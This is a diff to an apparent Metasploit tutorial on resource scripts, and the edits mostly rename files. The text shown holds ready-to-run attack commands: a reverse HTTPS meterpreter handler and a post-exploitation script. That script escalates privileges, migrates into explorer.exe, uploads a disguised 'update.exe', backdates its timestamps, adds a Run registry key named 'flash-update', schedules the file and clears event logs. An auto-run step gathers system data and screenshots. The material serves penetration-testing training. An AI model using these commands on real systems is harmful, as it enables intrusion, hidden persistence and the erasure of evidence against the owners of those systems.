@@ -65,16 +65,16 @@
 
 - **Create a resource file using bash terminal prompt::**`[bash prompt]`<br />
 
-      touch script.rc
+      touch handler.rc
 
-         echo 'use exploit/multi/handler' > script.rc
-         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> script.rc
-         echo 'set LHOST 192.168.1.71' >> script.rc
-         echo 'set LPORT 666' >> script.rc
-         echo 'set ExitOnSession false' >> script.rc
-         echo 'exploit' >> script.rc
+         echo 'use exploit/multi/handler' > handler.rc
+         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
+         echo 'set LHOST 192.168.1.71' >> handler.rc
+         echo 'set LPORT 666' >> handler.rc
+         echo 'set ExitOnSession false' >> handler.rc
+         echo 'exploit' >> handler.rc
 
-    `[run]` msfconsole -r /root/script.rc
+    `[run]` msfconsole -r /root/handler.rc
 
 - **Create a resource file using the core command 'makerc'::**`[metasploit prompt]`<br />
 
@@ -86,9 +86,9 @@
       msf exploit(multi/handler) > set ExitOnSession false
       msf exploit(multi/handler) > exploit
 
-      msf exploit(multi/handler) > makerc /root/script.rc
+      msf exploit(multi/handler) > makerc /root/handler.rc
 
-    `[run]` msf > resource /root/script.rc
+    `[run]` msf > resource /root/handler.rc
 
 <br />
 
@@ -120,18 +120,18 @@
 
 - **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[bash prompt]`<br />
 
-      touch script.rc
+      touch persistence.rc
 
-        echo 'getprivs' > script.rc
-        echo 'getsystem' >> script.rc
-        echo 'run migrate -n explorer.exe' >> script.rc
-        echo 'upload update.exe %temp%\\update.exe' >> script.rc
-        echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> script.rc
-        echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> script.rc
-        echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> script.rc
-        clearev
+        echo 'getprivs' > persistence.rc
+        echo 'getsystem' >> persistence.rc
+        echo 'run migrate -n explorer.exe' >> persistence.rc
+        echo 'upload update.exe %temp%\\update.exe' >> persistence.rc
+        echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> persistence.rc
+        echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> persistence.rc
+        echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> persistence.rc
+        echo 'clearev' >> persistence.rc
 
-     `[run]` meterpreter > resource /root/script.rc
+     `[run]` meterpreter > resource /root/persistence.rc
 
 <br /><br />
 
@@ -160,7 +160,7 @@
 ## RESOURCE SCRIPTS IN AutoRunScript
 <blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole 'AutoRunScript' handler flag, for this to work we need to define a global variable (setg RESOURCE /root/gather.rc) to call our resource script at session creation.</blockquote>
 
-- **RC::Post-Exploit::Script::**`[gather.rc]`<br />
+- **RC::Post-Exploit::Script::Gather::**`[gather.rc]`<br />
 
       touch gather.rc
 
@@ -168,20 +168,20 @@
          echo 'getuid' >> /root/gather.rc
          echo 'screenshot' >> /root/gather.rc
 
-- **RC::AutoRunScript::**`[script.rc]`<br />
+- **RC::AutoRunScript::Handler::**`[script.rc]`<br />
 
-      touch script.rc
+      touch handler.rc
 
-         echo 'setg resource /root/gather.rc' > script.rc
-         echo 'use exploit/multi/handler' >> script.rc
-         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> script.rc
-         echo 'set LHOST 192.168.1.71' >> script.rc
-         echo 'set LPORT 666' >> script.rc
-         echo 'set ExitOnSession false' >> script.rc
-         echo 'set AutoRunScript post/multi/gather/multi_command.rb' >> script.rc
-         echo 'exploit' >> script.rc
+         echo 'setg resource /root/gather.rc' > handler.rc
+         echo 'use exploit/multi/handler' >> handler.rc
+         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
+         echo 'set LHOST 192.168.1.71' >> handler.rc
+         echo 'set LPORT 666' >> handler.rc
+         echo 'set ExitOnSession false' >> handler.rc
+         echo 'set AutoRunScript post/multi/gather/multi_command' >> handler.rc
+         echo 'exploit' >> handler.rc
 
-     `[run]` msfconsole > resource -r /root/script.rc
+     `[run]` msfconsole > resource -r /root/handler.rc
 
 <br /><br />
 
